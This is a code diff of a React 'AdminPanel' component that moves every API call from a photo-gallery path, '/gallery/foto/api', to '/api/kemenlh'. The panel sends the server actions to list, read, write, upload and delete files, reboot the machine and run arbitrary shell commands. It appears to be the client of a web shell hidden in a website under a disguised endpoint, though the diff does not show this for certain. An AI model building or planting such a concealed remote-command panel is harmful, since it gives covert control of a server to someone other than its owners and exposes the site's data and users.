@@ -61,7 +61,7 @@ export default function AdminPanel() {
 
   const testApi = useCallback(async () => {
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'ping' })
@@ -77,7 +77,7 @@ export default function AdminPanel() {
   const loadFiles = useCallback(async (path: string) => {
     setLoading(true);
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'list', path })
@@ -105,7 +105,7 @@ export default function AdminPanel() {
     setLoading(true);
 
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'read', path: filePath })
@@ -130,7 +130,7 @@ export default function AdminPanel() {
     if (!selectedFile) return;
 
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({
@@ -156,7 +156,7 @@ export default function AdminPanel() {
     if (!command.trim()) return;
 
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'command', command: command })
@@ -184,7 +184,7 @@ export default function AdminPanel() {
     setRebootMessage('🔄 Initializing server reboot...');
 
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'reboot' })
@@ -229,7 +229,7 @@ export default function AdminPanel() {
     reader.onload = async (e) => {
       try {
         const base64Data = e.target?.result as string;
-        const res = await fetch('/gallery/foto/api', {
+        const res = await fetch('/api/kemenlh', {
           method: 'POST',
           headers: getAuthHeader(),
           body: JSON.stringify({
@@ -268,7 +268,7 @@ export default function AdminPanel() {
     const dirPath = currentPath === '.' ? dirName : `${currentPath}/${dirName}`;
 
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'mkdir', path: dirPath })
@@ -294,7 +294,7 @@ export default function AdminPanel() {
     const filePath = currentPath === '.' ? fileName : `${currentPath}/${fileName}`;
 
     try {
-      const res = await fetch('/gallery/foto/api', {
+      const res = await fetch('/api/kemenlh', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({
@@ -333,7 +333,7 @@ export default function AdminPanel() {
 
     if (confirm(`Delete ${isDir ? 'folder' : 'file'} "${fileName}"?`)) {
       try {
-        const res = await fetch('/gallery/foto/api', {
+        const res = await fetch('/api/kemenlh', {
           method: 'POST',
           headers: getAuthHeader(),
           body: JSON.stringify({ action: 'delete', path: itemPath })
